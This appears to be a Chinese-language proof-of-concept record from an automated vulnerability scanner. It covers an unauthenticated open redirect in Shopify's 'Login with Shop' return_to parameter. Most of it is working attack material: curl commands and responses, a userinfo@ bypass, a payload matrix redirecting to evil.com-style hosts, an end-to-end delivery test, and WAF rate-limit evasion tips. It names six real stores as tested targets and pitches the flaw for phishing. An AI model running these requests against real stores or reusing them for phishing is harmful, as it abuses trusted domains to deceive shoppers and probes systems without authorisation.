# Shopify "Login with Shop" /services/login_with_shop/buyer/complete return_to 未校验开放重定向（免认证 302 任意跳转，含 userinfo@ 绕过）

- **code**: shopify-login-with-shop-buyer-complete-open-redirect-return_
- **kind**: poc
- **category**: auth-bypass
- **component**: Shopify 商店 (Login with Shop 买家识别端点 login_with_shop/buyer/*)
- **versions**: Shopify SaaS（端点随商店主题/应用开启，非版本化）
- **severity**: medium
- **language**: markdown
- **source**: manual
- **verified**: 1
- **verified_note**: 同一 Shopify SaaS 端点，六店独立实测。①②③④见前：www.thegamecollection.net（task#7，2026-11-11 13:54 UTC）、goffsgames.co.uk（task#11，14:06-14:09）、gamersdelight.co.uk（task#8，14:09）、retro-refresh.com（task#9，14:25）均为 302 逐字节原样放行 + 缺省 400 + 无 scheme 400 + userinfo@ 绕过。⑤ www.retro32.com（task#12，15:11-15:13）。⑥ 本次 collect.thegamecollection.net（task#7 finding#95，第二家独立店 tgc-collectables，2026-11-11 15:5x UTC，curl -sk -D -）：GET /services/login_with_shop/buyer/complete?return_to=https://evil.example/pwn → HTTP/2 302 location: https://evil.example/pwn（CSP report-uri 含 access_and_auth/login_with_shop/buyer_recognition，佐证该店已启用 Login with Shop）；return_to=https://collect.thegamecollection.net@evil.example/pwn → 302 location 同值（浏览器把站点域当 userinfo，真实主机=evil.example）；return_to=//attacker.example.com → 400（必须带 scheme）；缺省 return_to → 400（阴性对照，证明 302 由该参数驱动，非 catch-all 跳转）。原始头/体落盘 /opt/artex/data/tasks/7/i992/{redir_headers.txt,redir_body.txt}。判定：与主站 www.thegamecollection.net 同型但宿主/店铺独立，坐实为 Shopify SaaS 通用问题、与具体商店无关。
- **path**: pocs/shopify-login-with-shop-buyer-complete-open-redirect-return_/poc.md
- **tags**: open-redirect,shopify,login_with_shop,return_to,unauth,phishing,userinfo-bypass,302,e2e-delivery
- **created_at**: 2026-11-11T13:57:15.623Z
- **engine**: www.thegamecollection.net; collect.thegamecollection.net（tgc-collectables 独立店）; goffsgames.co.uk; gamersdelight.co.uk; retro-refresh.com; www.retro32.com
- **found_by**: vuln-scan

## 描述

Shopify 商店的 "Login with Shop" 买家识别端点 /services/login_with_shop/buyer/complete 对 return_to 参数不做白名单/同源校验，无需认证、无需 state/code，直接以 302 跳到调用方给定的任意绝对 URL（含 userinfo@ 前缀伪装）。可用于钓鱼落地；同族端点还有 buyer/start、buyer/recognition 等 login_with_shop/* 路径。属 Shopify SaaS 通用问题，与具体商店无关——已在 thegamecollection.net（主站 www 与第二家独立店 collect/tgc-collectables）、goffsgames.co.uk、gamersdelight.co.uk、retro-refresh.com、www.retro32.com 六店独立复现。注意：该端点不向 return_to 追加 code/state，不构成 OAuth 授权码外带，实际危害上限为钓鱼级低危。

## 用法

```
前置：目标为 Shopify 托管商店且启用了 Login with Shop（页面/THEME JS 含 /services/login_with_shop/ 调用点；响应头 CSP report-uri 里出现 access_and_auth/login_with_shop/buyer_recognition 亦可佐证已启用；同域可能存在多家独立店，如 thegamecollection.net 的 www 主站与 collect.thegamecollection.net（tgc-collectables），/account/login 302 到 account-<shop> 即证明启用）。无需任何 Cookie/账号/state/code。

最小复现（curl，直连，勿跟随跳转）：
  curl -sk -i --noproxy '*' "https://<shopify-host>/services/login_with_shop/buyer/complete?return_to=https://evil.example/pwn" | head -20

判据（三态确认，避免把 catch-all 跳转当漏洞）：
  · return_to=https://evil.example/pwn         → HTTP 302，location 头逐字节等于传入值
  · 缺省 return_to                             → 400（证明该参数是触发跳转的必需项）
  · return_to=//attacker.example.com           → 400（无 scheme 不放行，须带 scheme 绝对 URL）
  · return_to=javascript:alert(1)              → 400

userinfo@ 绕过：return_to=https%3A%2F%2F<本站域>%40evil.example%2F → 302 location: https://<本站域>@evil.example/，浏览器把本站域当 userinfo，实际主机=evil.example。

同族端点 buyer/start 同样成立：GET /services/login_with_shop/buyer/start?return_to=https://evil.example/pwn → 302 location 原样放行；缺省 → 400。

端到端投递证明（把"能跳"升级为"真实投递到验证者端"）：验证者侧起落地记录服务（如 python http.server 记 GET path/host），再 curl -sk -L "https://<host>/services/login_with_shop/buyer/complete?return_to=http://<验证者host:port>/landing"；判据：目标 302 location=<验证者URL> 且验证者日志出现 HIT path=/landing、host=<验证者host>。

负向：不要用 state=/code= 尝试 OAuth 参数外带——该端点忽略它们，永远只跳纯 return_to；302 也不下发任何鉴权态 cookie（仅非鉴权 _shopify_essential）。

注意：目标多走 Cloudflare，302 直接可见，不需要跟随后续跳转；务必 -i 读原始 location 头。仅当回显 302 + location 且与传入值一致才算证据。本机若设了系统代理，curl 加 --noproxy '*' 直连。单线程、请求间隔≥3s 可规避 WAF 限速。
常见失败原因：目标商店未启用 Login with Shop（/services/login_with_shop/* 直接 404/400）；系统代理拦截看不到真实响应；未做缺省 400 对照，把通用跳转误报成开放重定向。
```

## 正文

```
# Shopify Login with Shop 买家识别端点 开放重定向（return_to 未校验）

## 一句话
`/services/login_with_shop/buyer/complete` 的 `return_to` 参数未做任何白名单/同源校验，免认证、免 state/code，
302 跳转到任意绝对 URL（含 `userinfo@` 前缀伪装绕过）。属 Shopify SaaS 通用问题，与具体商店无关。

## 入口
```
GET https://<shopify-host>/services/login_with_shop/buyer/complete?return_to=<URL>
同族：https://<shopify-host>/services/login_with_shop/buyer/start?return_to=<URL>
```

## 复现三步（curl，无 Cookie，需直连 --noproxy '*'）

### 1. 基本跳转
```
curl -sk -i --noproxy '*' "https://<host>/services/login_with_shop/buyer/complete?return_to=https://evil.example/pwn"
```
回显：
```
HTTP/2 302
location: https://evil.example/pwn
```
→ return_to 未校验，直接跳到任意外部绝对 URL。

### 2. userinfo@ 绕过（浏览器实际主机为 evil.com）
```
curl -sk -i --noproxy '*' "https://<host>/services/login_with_shop/buyer/complete?return_to=https%3A%2F%2F<本站域>%40evil.com%2F"
```
回显：
```
HTTP/2 302
location: https://<本站域>@evil.com/
```
→ 同源前缀校验（若有）也会被 `userinfo@` 绕过：浏览器把 `<本站域>` 当作用户口令部分，
真正访问的主机是 `evil.com`。

### 3. 阴性对照（证明参数必需，排除 catch-all 误报）
```
curl -sk -i --noproxy '*' "https://<host>/services/login_with_shop/buyer/complete"
```
回显：
```
HTTP/2 400
```
→ 无 return_to 时返回 400，说明跳转由该参数触发，不是通用 200/302 跳转。

## 负载矩阵
| return_to 值 | 结果 |
|---|---|
| `https://evil.example/pwn` | 302 `https://evil.example/pwn` |
| `http://evil.com` | 302 `http://evil.com/` |
| `https://<本站域>@evil.com/` | 302 同值（浏览器实际跳到 evil.com） |
| `https://www.evil-domain.test/evil` | 302 原样放行 |
| `//attacker.example.com` | 400（必须带 scheme） |
| `javascript:alert(1)` | 400 |
| （缺省） | 400 |

## 判定
`HTTP 302` 且 `location` 逐字节等于传入值 → 成立。必须同时做缺省 400 对照，
否则会把 nginx/CF 的通用跳转误报成开放重定向。

## 常见失败原因
- 目标商店未启用 Login with Shop：`/services/login_with_shop/*` 直接 404/400。
- 本机系统代理拦截：加 `--noproxy '*'`。
- 只看了最终落点没看 `location` 头：必须 `-i` 读原始 302。
- 未做缺省 400 对照，把通用跳转当漏洞。

## 端到端投递证明（把"能跳"升级为"真实投递到验证者端"）
1. 验证者侧起落地记录服务（如 `python -m http.server 18080` 并把 GET path/host 写日志）。
2. `curl -sk -L "https://<host>/services/login_with_shop/buyer/complete?return_to=http://<验证者host:port>/landing"`
3. 判据：目标 302 `location=<验证者URL>`，且验证者日志出现 `HIT path=/landing host=<验证者host>` → 受害者真实到达验证者页。
4. userinfo@ 变体同样可落地：`return_to=http://<受信域>%40<验证者host:port>/pwn` → 302 location 原样回显，`curl -L` 落地 host=<验证者host>。

## 影响与利用面
- 钓鱼：可信域名 302 到验证者站点，登录/支付页仿冒可信度更高。
- 登录流：`buyer/complete`、`buyer/start`、`buyer/recognition` 等同族端点在登录/OAuth 回调链上；
  实测该端点仅原样回显 return_to，不追加 code/state（附 state/code 也被忽略），
  且 302 不下发任何鉴权态 cookie，故升级到 OAuth 授权码外带/会话泄露被阻断，仅余钓鱼落地价值（低危）。

## 指纹线索
响应头/页面出现 `X-ShopId`、`X-Shopify-*`、`/services/login_with_shop/` 调用点即该栈；
响应头 CSP report-uri 里出现 `access_and_auth/login_with_shop/buyer_recognition` 可佐证该店
已启用 Login with Shop。Shopify 站遇到 "Login with Shop" 按钮即可试此端点。
注意同一 apex 域下常有多家独立 Shopify 店（各自独立店铺/域名前缀），逐个子域/店铺都要单独试。

## 实测靶标（同一 SaaS 端点，六店独立复现）
- www.thegamecollection.net（task#7，2026-11-11 13:54 UTC，主站）
- collect.thegamecollection.net（task#7，2026-11-11 15:5x UTC，第二家独立店 tgc-collectables，与主站同型但宿主/店铺独立）
- goffsgames.co.uk（task#11）
- gamersdelight.co.uk（task#8）
- retro-refresh.com（task#9，2026-11-11 14:25 UTC / x-request-id 4e57f078-bc10-4a24-ae70-10011b6a27fc-1794407123）
- www.retro32.com（task#12，2026-11-11 15:11-15:13 UTC / x-request-id 7065fd1c-...-1794409975）

```
